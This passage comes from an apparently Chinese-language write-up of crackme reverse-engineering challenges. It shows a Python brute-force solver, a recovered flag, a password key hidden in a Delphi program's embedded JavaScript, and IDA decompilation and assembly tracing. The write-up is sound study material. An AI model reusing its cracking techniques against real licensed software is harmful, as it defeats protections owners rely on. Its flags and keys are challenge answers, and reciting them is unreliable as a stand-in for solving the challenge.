class=\"line\"></span><br><span class=\"line\">mm = [<span class=\"number\">0x9b</span>,<span class=\"number\">0x6b</span>,<span class=\"number\">0xba</span>,<span class=\"number\">0x25</span>,<span class=\"number\">0x73</span>,<span class=\"number\">0x82</span>,<span class=\"number\">0xe0</span>,<span class=\"number\">0x31</span>,<span class=\"number\">0x86</span>,<span class=\"number\">0x80</span>,<span class=\"number\">0xf1</span>,<span class=\"number\">0xc5</span>,<span class=\"number\">0xda</span>,<span class=\"number\">0x82</span>,<span class=\"number\">0xda</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x38</span>,<span class=\"number\">0x90</span>]</span><br><span class=\"line\"><span class=\"comment\">#mm = [0x25,0x73,0x82]</span></span><br><span class=\"line\">mm2 = []</span><br><span class=\"line\">result  = []</span><br><span class=\"line\"></span><br><span class=\"line\">x1 = <span class=\"number\">0</span></span><br><span class=\"line\">x2 = <span class=\"number\">0</span></span><br><span class=\"line\">x3 = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">5</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> x1 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">                mv = mm[<span class=\"number\">0</span>+<span class=\"number\">3</span>*i] ^ x1</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (array[mv&gt;&gt;<span class=\"number\">2</span>] ^ <span class=\"number\">7</span>) == array1[<span class=\"number\">0</span>+<span class=\"number\">4</span>*i]:</span><br><span class=\"line\">                        x11 = <span class=\"number\">16</span> * mv &amp; <span class=\"number\">0x30</span></span><br><span class=\"line\">                        <span class=\"keyword\">for</span> x2 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">                                mv = mm[<span class=\"number\">1</span>+<span class=\"number\">3</span>*i] ^ x2</span><br><span class=\"line\">                                <span class=\"keyword\">if</span>(array[x11 | mv &gt;&gt;<span class=\"number\">4</span>] == array1[<span class=\"number\">1</span>+<span class=\"number\">4</span>*i]):</span><br><span class=\"line\">                                        x22 = <span class=\"number\">4</span> * mv &amp; <span class=\"number\">0x3C</span></span><br><span class=\"line\">                                        <span class=\"keyword\">for</span> x3 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">                                                mv = mm[<span class=\"number\">2</span>+<span class=\"number\">3</span>*i] ^ x3                                       </span><br><span class=\"line\">                                                <span class=\"keyword\">if</span>((array[x22 | (mv &amp; <span class=\"number\">0xc0</span>)&gt;&gt;<span class=\"number\">6</span>]) ^ <span class=\"number\">0xf</span>) == array1[<span class=\"number\">2</span>+<span class=\"number\">4</span>*i]:</span><br><span class=\"line\">                                                        <span class=\"keyword\">if</span> array[mv &amp; <span class=\"number\">0x3F</span>] == array1[<span class=\"number\">3</span>+<span class=\"number\">4</span>*i]:</span><br><span class=\"line\">                                                                <span class=\"keyword\">print</span> chr(x1),chr(x2),chr(x3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x1 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        mv = <span class=\"number\">0x08</span> ^ x1</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (array[mv&gt;&gt;<span class=\"number\">2</span>] ^ <span class=\"number\">7</span>) == <span class=\"number\">0x5c</span>:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> chr(x1)</span><br><span class=\"line\">                x11 = <span class=\"number\">16</span> * mv &amp; <span class=\"number\">0x30</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> x11 == <span class=\"number\">0x67</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">print</span> chr(x1)</span><br></pre></td></tr></table></figure></p>\n<p>  得出最后的flag为fu0kzHp2aqtZAuY6</p>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>第三题是一个dephi编写的程序，主要利用了WebBrowser控件，将密码藏在js代码中。拖入ida，观察到如下函数Tfrmcrackme_FormShow(int a1)：<br>该函数是webbrowser主要内容，通过跟踪和调试，可以比较好的确定webbrowser的代码如下：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sptWBCallback</span>(<span class=\"params\">spt_wb_id,spt_wb_name,optionstr</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\turl=<span class=\"string\">'#sptWBCallback:id='</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">\turl=url+spt_wb_id+<span class=\"string\">';eventName='</span>+spt_wb_name;</span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"keyword\">if</span>(optionstr) </span></span><br><span class=\"line\"><span class=\"javascript\">\turl=url+<span class=\"string\">';params=optionstr'</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">\tlocation=url;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ckpswd</span>(<span class=\"params\"></span>) </span>&#123;    </span></span><br><span class=\"line\"><span class=\"javascript\">\tkey=<span class=\"string\">\"simpower91\"</span>;    </span></span><br><span class=\"line\"><span class=\"javascript\">\ta = <span class=\"built_in\">document</span>.all.pswd.value;    </span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"keyword\">if</span> (a.indexOf(key) ==<span class=\"number\">0</span>) &#123;        </span></span><br><span class=\"line\"><span class=\"undefined\">\tl=a.length;        </span></span><br><span class=\"line\"><span class=\"undefined\">\ti=key.length;        </span></span><br><span class=\"line\"><span class=\"undefined\">\tsptWBCallback(a.substring(i,l));    </span></span><br><span class=\"line\"><span class=\"undefined\">\t&#125; </span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"keyword\">else</span> &#123;        </span></span><br><span class=\"line\"><span class=\"javascript\">\t\talert(<span class=\"string\">\"wrong!&lt;\"</span> + a + <span class=\"string\">\"&gt; is not my GUID ;-)\"</span>);        </span></span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"1234\"</span>;    </span></span><br><span class=\"line\"><span class=\"undefined\">\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ok</span>(<span class=\"params\"></span>)</span>&#123;  </span></span><br><span class=\"line\"><span class=\"javascript\">\talert(<span class=\"string\">\"congratulations!\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"pswd\"</span> <span class=\"attr\">size</span>=<span class=\"string\">39</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">button</span> <span class=\"attr\">value</span>=<span class=\"string\">\"checkMyFlag\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"ckpswd();\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>得出来key为simpower91，然后会触发sptWBCallback函数，函数会通过location=url复制进行url的变化，在delphi中，该操作是会触发onnavigator2回调函数的，在Tfrmcrackme_FormCreate(int a1)函数中的sub_491DCC函数中，有如下的函数，尝试对sub_492088()下断点，发现可以直接断下，判断该函数为js中location=url的回调函数。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">fastcall <span class=\"title\">sub_491DCC</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = a1;</span><br><span class=\"line\">  sub_491B78(a1);</span><br><span class=\"line\">  result = *(_DWORD *)(v1 + <span class=\"number\">64</span>);</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">676</span>) = v1;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">672</span>) = <span class=\"number\">0x00492088</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>跟踪该函数如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __userpurge sptWBCallback@&lt;eax&gt;(<span class=\"keyword\">int</span> a1@&lt;eax&gt;, <span class=\"keyword\">int</span> a2@&lt;edx&gt;, <span class=\"keyword\">int</span> a3@&lt;ecx&gt;, <span class=\"keyword\">int</span> a4@&lt;ebx&gt;, <span class=\"keyword\">int</span> a5@&lt;esi&gt;, <span class=\"keyword\">int</span> edi0@&lt;edi&gt;, _WORD *a6, <span class=\"keyword\">int</span> a7, <span class=\"keyword\">int</span> a8, <span class=\"keyword\">int</span> a9, <span class=\"keyword\">int</span> a10, <span class=\"keyword\">int</span> a11)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  System::AnsiString = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v29 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)input_url_str = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v27 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v26 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v25 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v24 = a4;</span><br><span class=\"line\">  v23 = a5;</span><br><span class=\"line\">  v31 = a3;</span><br><span class=\"line\">  v32 = a2;</span><br><span class=\"line\">  v12 = a1;</span><br><span class=\"line\">  v22 = &amp;savedregs;</span><br><span class=\"line\">  v21 = &amp;loc_4921D1;</span><br><span class=\"line\">  v20 = __readfsdword(<span class=\"number\">0</span>);</span><br><span class=\"line\">  __writefsdword(<span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)&amp;v20);</span><br><span class=\"line\">  Variants::__<span class=\"function\">linkproc__ <span class=\"title\">VarToLStr</span><span class=\"params\">(&amp;v29, a11)</span></span>;</span><br><span class=\"line\">  v13 = sub_465C88((<span class=\"keyword\">int</span>)&amp;str__sptWBCallback_[<span class=\"number\">1</span>], v29);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v13 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *a6 = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    Variants::__<span class=\"function\">linkproc__ <span class=\"title\">VarToLStr</span><span class=\"params\">(&amp;System::AnsiString, a11)</span></span>;</span><br><span class=\"line\">    v14 = LStrLen(System::AnsiString);</span><br><span class=\"line\">    v15 = System::__linkproc__ LStrCopy(System::AnsiString, (<span class=\"keyword\">int</span>)(v13 + <span class=\"number\">15</span>),v14 - (_DWORD)v13 - <span class=\"number\">14</span>,(<span class=\"keyword\">int</span>)&amp;System::AnsiString);</span><br><span class=\"line\">    LOBYTE(v15) = <span class=\"number\">1</span>;</span><br><span class=\"line\">    LStrReplace(System::AnsiString, (<span class=\"keyword\">int</span>)&amp;str___41[<span class=\"number\">1</span>], (<span class=\"keyword\">int</span>)&amp;str____19[<span class=\"number\">1</span>], v12, edi0, (<span class=\"keyword\">int</span>)v13, (<span class=\"keyword\">int</span>)input_url_str, v15);</span><br><span class=\"line\">    System::__linkproc__ LStrLAsg(&amp;System::AnsiString, *(_DWORD *)input_url_str);</span><br><span class=\"line\">    v16 = (Classes::TStrings *)TObject_Create((<span class=\"keyword\">int</span>)cls_Classes_TStringList, <span class=\"number\">1</span>);</span><br><span class=\"line\">    (*(<span class=\"keyword\">void</span> (__fastcall **)(Classes::TStrings *, <span class=\"keyword\">int</span>))(*(_DWORD *)v16 + <span class=\"number\">44</span>))(v16, System::AnsiString);<span class=\"comment\">// TStrings.SetTextStr</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_WORD *)(v12 + <span class=\"number\">50</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      Classes::TStrings::GetValue(v16, (<span class=\"keyword\">const</span> <span class=\"keyword\">int</span>)&amp;str_params[<span class=\"number\">1</span>]);</span><br><span class=\"line\">      v17 = v27;</span><br><span class=\"line\">      Classes::TStrings::GetValue(v16, (<span class=\"keyword\">const</span> <span class=\"keyword\">int</span>)&amp;str_eventName[<span class=\"number\">1</span>]);</span><br><span class=\"line\">      v18 = v26;</span><br><span class=\"line\">      Classes::TStrings::GetValue(v16, (<span class=\"keyword\">const</span> <span class=\"keyword\">int</span>)&amp;str_id[<span class=\"number\">1</span>]);</span><br><span class=\"line\">      (*(<span class=\"keyword\">void</span> (__fastcall **)(_DWORD, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>))(v12 + <span class=\"number\">48</span>))(*(_DWORD *)(v12 + <span class=\"number\">52</span>), v25, v18, v17);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_WORD *)(v12 + <span class=\"number\">58</span>) )</span><br><span class=\"line\">    (*(<span class=\"keyword\">void</span> (__fastcall **)(_DWORD, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>, _WORD *))(v12 + <span class=\"number\">56</span>))(</span><br><span class=\"line\">      *(_DWORD *)(v12 + <span class=\"number\">60</span>),</span><br><span class=\"line\">      v32,</span><br><span class=\"line\">      v31,</span><br><span class=\"line\">      a11,</span><br><span class=\"line\">      a10,</span><br><span class=\"line\">      a9,</span><br><span class=\"line\">      a8,</span><br><span class=\"line\">      a7,</span><br><span class=\"line\">      a6);</span><br><span class=\"line\">  __writefsdword(<span class=\"number\">0</span>, v20);</span><br><span class=\"line\">  v22 = (<span class=\"keyword\">int</span> *)&amp;loc_4921D8;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> System::__linkproc__ LStrArrayClr(&amp;v25, <span class=\"number\">6</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>继续调试，进入到(<em>(void (__fastcall **)(_DWORD, int, int, int))(v12 + 48))(</em>(_DWORD *)(v12 + 52), v25, v18, v17)函数中，继续步进，发现如下函数：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE:<span class=\"number\">0047394</span>C sub_47394C      proc near               ; CODE XREF: _Tfrmcrackme_Button2Click+A1↓p</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C var_2C          = dword ptr <span class=\"number\">-2</span>Ch</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C var_8           = dword ptr <span class=\"number\">-8</span></span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C var_4           = dword ptr <span class=\"number\">-4</span></span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C var_s0          = dword ptr  <span class=\"number\">0</span></span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C arg_4           = dword ptr  <span class=\"number\">0</span>Ch</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>C                 push    ebp</span><br><span class=\"line\">CODE:<span class=\"number\">0047394</span>D                 mov     ebp, esp</span><br><span class=\"line\">CODE:<span class=\"number\">0047394F</span>                 leave</span><br><span class=\"line\">CODE:<span class=\"number\">00473950</span>                 push    dword ptr [esp+<span class=\"number\">0</span>]</span><br><span class=\"line\">CODE:<span class=\"number\">00473953</span>                 push    [esp+var_s0]</span><br><span class=\"line\">CODE:<span class=\"number\">00473956</span>                 push    [esp+<span class=\"number\">4</span>+var_4]</span><br><span class=\"line\">CODE:<span class=\"number\">00473959</span>                 pusha</span><br><span class=\"line\">CODE:<span class=\"number\">0047395</span>A                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">0047395B</span>                 call    GetA400BaseAddr</span><br><span class=\"line\">CODE:<span class=\"number\">00473960</span>                 mov     ebx, eax</span><br><span class=\"line\">CODE:<span class=\"number\">00473962</span>                 xor     eax, eax</span><br><span class=\"line\">CODE:<span class=\"number\">00473964</span>                 mov     [ebx+<span class=\"number\">1050</span>h], eax</span><br><span class=\"line\">CODE:<span class=\"number\">0047396</span>A                 mov     eax, <span class=\"number\">0F</span>FFFFFFFh</span><br><span class=\"line\">CODE:<span class=\"number\">0047396F</span>                 mov     [ebx+<span class=\"number\">1054</span>h], eax</span><br><span class=\"line\">CODE:<span class=\"number\">00473975</span>                 mov     [esp+<span class=\"number\">2</span>Ch+var_8], ebx</span><br><span class=\"line\">CODE:<span class=\"number\">00473979</span>                 add     [esp+<span class=\"number\">2</span>Ch+var_4], <span class=\"number\">5</span></span><br><span class=\"line\">CODE:<span class=\"number\">0047397</span>E                 mov     eax, [esp+<span class=\"number\">2</span>Ch+arg_4]</span><br><span class=\"line\">CODE:<span class=\"number\">00473982</span>                 mov     [esp+<span class=\"number\">2</span>Ch+var_s0], eax</span><br><span class=\"line\">CODE:<span class=\"number\">00473986</span>                 mov     eax, [ebx+<span class=\"number\">1090</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">0047398</span>C                 cmp     eax, <span class=\"number\">0</span></span><br><span class=\"line\">CODE:<span class=\"number\">0047398F</span>                 jnz     <span class=\"keyword\">short</span> loc_47399C</span><br><span class=\"line\">CODE:<span class=\"number\">00473991</span>                 mov     eax, offset sub_47378C</span><br><span class=\"line\">CODE:<span class=\"number\">00473996</span>                 mov     [ebx+<span class=\"number\">1090</span>h], eax</span><br><span class=\"line\">CODE:<span class=\"number\">0047399</span>C</span><br><span class=\"line\">CODE:<span class=\"number\">0047399</span>C loc_47399C:                             ; CODE XREF: sub_47394C+<span class=\"number\">43</span>↑j</span><br><span class=\"line\">CODE:<span class=\"number\">0047399</span>C                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">0047399</span>D                 popa</span><br><span class=\"line\">CODE:<span class=\"number\">0047399</span>E                 call    sub_4734B0</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A3                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A4                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A5                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A6                 pusha</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A7                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>A8                 jmp     <span class=\"keyword\">short</span> loc_4739CE</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>AA ; ---------------------------------------------------------------------------</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>AA</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>AA loc_4739AA:                             ; CODE XREF: sub_47394C+<span class=\"number\">95</span>↓j</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>AA                 mov     eax, [ebx+<span class=\"number\">1058</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">004739B</span>0                 mov     [esp+<span class=\"number\">2</span>Ch+var_s0], eax</span><br><span class=\"line\">CODE:<span class=\"number\">004739B</span>4                 mov     eax, [ebx+<span class=\"number\">1050</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">004739B</span>A                 mov     [esp+<span class=\"number\">2</span>Ch+var_4], eax</span><br><span class=\"line\">CODE:<span class=\"number\">004739B</span>E                 mov     [esp+<span class=\"number\">2</span>Ch+var_8], ebx</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>C2                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>C3                 popa</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>C4                 call    sub_4734B0</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>C9                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CA                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CB                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CC                 pusha</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CD                 pushf</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CE</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CE loc_4739CE:                             ; CODE XREF: sub_47394C+<span class=\"number\">5</span>C↑j</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>CE                 call    GetA400BaseAddr</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>D3                 mov     ebx, eax</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>D5                 mov     eax, [ebx+<span class=\"number\">1050</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>DB                 cmp     eax, [ebx+<span class=\"number\">1054</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">004739E1</span>                 jb      <span class=\"keyword\">short</span> loc_4739AA</span><br><span class=\"line\">CODE:<span class=\"number\">004739E3</span>                 mov     eax, [ebx+<span class=\"number\">1050</span>h]</span><br><span class=\"line\">CODE:<span class=\"number\">004739E9</span>                 mov     [esp+<span class=\"number\">30</span>h], eax</span><br><span class=\"line\">CODE:<span class=\"number\">004739</span>ED                 mov     eax, [esp+<span class=\"number\">2</span>Ch+var_2C]</span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>0                 mov     [esp+<span class=\"number\">2</span>Ch+var_s0], eax</span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>4                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>5                 popa</span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>6                 add     esp, <span class=\"number\">8</span></span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>9                 popf</span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>A                 retn    <span class=\"number\">8</span></span><br><span class=\"line\">CODE:<span class=\"number\">004739F</span>A sub_47394C      endp</span><br></pre></td></tr></table></figure></p>\n<p>这个还挺麻烦的，里面有很多的popa,pusha,popf等，所以慢慢跟踪到如下函数.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 